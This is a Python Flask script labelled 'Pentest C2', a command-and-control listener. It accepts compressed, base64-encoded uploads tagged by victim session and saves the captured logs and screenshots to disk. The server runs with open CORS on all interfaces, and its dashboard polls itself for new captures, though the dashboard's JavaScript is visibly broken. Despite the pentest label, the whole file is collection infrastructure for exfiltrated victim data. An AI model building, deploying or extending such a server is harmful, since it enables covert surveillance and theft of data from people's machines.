#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import os, json, base64, zlib
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
CORS(app)

os.makedirs("data/logs", exist_ok=True)
os.makedirs("data/screenshots", exist_ok=True)
os.makedirs("data/files", exist_ok=True)

@app.route("/receive", methods=["POST"])
def receive():
    try:
        data = request.get_json()
        session = data.get("session", "unknown")
        payload = json.loads(zlib.decompress(base64.b64decode(data["data"])).decode())
        
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON
        with open(f"data/logs/{session}_{ts}.json", "w") as f:
            json.dump(payload, f)
        
        # Save screenshots
        for i, shot in enumerate(payload.get("screenshots", [])):
            with open(f"data/screenshots/{session}_{i}_{ts}.jpg", "wb") as f:
                f.write(base64.b64decode(shot["data"]))
        
        return jsonify({"status": "ok", "session": session})
    except:
        return jsonify({"error": "fail"}), 500

@app.route("/")
def dashboard():
    return """
<!DOCTYPE html>
<html><head><title>Pentest C2</title>
<style>body{background:black;color:lime;font-family:monospace;padding:20px}
img{width:200px;height:150px;margin:5px}</style></head>
<body><h1>🚀 PENTEST C2 LIVE</h1>
<div id="shots"></div>
<script>
setInterval(async()=>{{
  const res = await fetch('/');
  document.getElementById('shots').innerHTML = res.text();
}}, 10000);
</script>
</body></html>"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))